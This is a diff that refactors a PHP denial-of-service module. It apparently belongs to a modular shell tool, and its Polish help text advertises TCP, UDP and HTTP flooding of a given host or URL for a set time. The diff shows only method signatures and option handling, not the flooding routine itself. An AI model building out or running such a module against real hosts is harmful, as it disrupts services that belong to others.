@@ -493,7 +493,7 @@ class ModuleDos extends ModuleAbstract
      * @access public
      * @return array
      */
-    public function getCommands()
+    public static function getCommands()
     {
         return array
         (
@@ -508,7 +508,7 @@ class ModuleDos extends ModuleAbstract
      * @access public
      * @return string
      */
-    public function getVersion()
+    public static function getVersion()
     {
         /**
          * Wersja Data Autor
@@ -522,7 +522,7 @@ class ModuleDos extends ModuleAbstract
      * @access public
      * @return string
      */
-    public function getHelp()
+    public static function getHelp()
     {
         return <<<DATA
 Denial Of Service - floodowanie tcp, udp i http
@@ -563,15 +563,15 @@ DATA;
             return 'dos, flood - !!! moduł nie został załadowany';
         }
 
-        $sHost = $this->oShell->getArgs()->getOption('host') ?: $this->oShell->getArgs()->getOption('url');
-        $sType = $this->oShell->getArgs()->getOption('type');
-        $iTime = (int)$this->oShell->getArgs()->getOption('time');
+        $sHost = $this->oArgs->getOption('host') ?: $this->oArgs->getOption('url');
+        $sType = $this->oArgs->getOption('type');
+        $iTime = (int)$this->oArgs->getOption('time');
 
         /**
          * Help
          */
         if (!$sHost || !$sType || !$iTime) {
-            return $this->getHelp();
+            return self::getHelp();
         }
 
         if (PHP_SAPI !== 'cli') {
@@ -586,7 +586,7 @@ DATA;
                 ->setHost($sHost)
                 ->setType($sType)
                 ->setTime($iTime)
-                ->setNewConnection($this->oShell->getArgs()->getOption('n'))
+                ->setNewConnection($this->oArgs->getOption('n'))
                 ->get();
 
             ob_end_flush();
